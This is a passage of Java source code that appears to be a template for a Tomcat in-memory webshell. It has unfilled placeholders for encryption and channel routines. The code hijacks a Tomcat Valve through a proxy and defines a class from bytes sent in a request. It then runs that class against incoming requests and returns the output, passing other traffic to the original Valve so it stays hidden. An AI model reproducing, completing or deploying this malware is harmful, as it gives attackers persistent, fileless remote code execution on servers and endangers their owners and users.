                    {variable}
                    {requestChannel}
                    {requestDecryptionChain}
                    if (requestData==null || requestData.length==0){
                        throw new RuntimeException();
                    }
                    if (payload == null){
                        payload = new TomcatMemoryShell(getClass().getClassLoader()).defineClass(requestData,0,requestData.length);
                    }else {
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        Object f = payload.newInstance();
                        f.equals(request);
                        f.equals(arrOut);
                        f.equals(requestData);
                        f.toString();
                        byte[] responseData = arrOut.toByteArray();

                        if (responseData.length == 0){
                            throw new RuntimeException();
                        }
                        arrOut.reset();
                        Method setSuspendedMethod = getMethodByClass(response.getClass(),"setSuspended",new Class[]{boolean.class});
                        if (setSuspendedMethod!=null){
                            setSuspendedMethod.invoke(response,false);
                        }
                        {responseEncryptionChain}
                        {responseBodyAppendStart}
                        {responseChannel}
                        {responseBodyAppendEnd}
                        return null;
                    }
                }
            } catch (Throwable e) {
                return method.invoke(oldValve, args);
            }
        }
        return method.invoke(oldValve, args);
    }
}
